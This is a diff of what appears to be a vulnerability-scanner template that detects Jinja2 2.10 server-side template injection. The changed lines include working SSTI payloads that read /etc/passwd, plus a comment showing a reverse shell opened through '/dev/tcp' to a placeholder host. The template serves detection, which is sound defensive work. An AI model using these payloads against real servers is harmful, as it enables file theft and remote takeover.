@@ -1,20 +1,26 @@
 id: ssti
 
+# from_string function is prone to SSTI where it takes the "source" parameter as a template object and render it and then return it.
+# Reading the /etc/passwd
+# http://localhost/search/?u={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+# Getting a reverse shell
+# http://localhost/search?u={{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }}
+
 info:
-  name: Jinja2 2.10 - SSTI
+  name: Jinja2 2.10 - Command injection from_string function
   author: pikpikcu
   severity: high
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}{{4*4}}"
+      - "{{BaseURL}}{{100*285}}"
       - "{{BaseURL}}{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
-      - "{{BaseURL}}{{[].__class__.__base__.__subclasses__().pop(40)('/etc/shadow').read()}}"
-    matchers:   
-      - type: word
-        words:
-          - "16"
+    matchers:
+      - type: regex
+        regex:
+          - "28500"
           - "root:x:0:0:root:"
         part: body
+
 
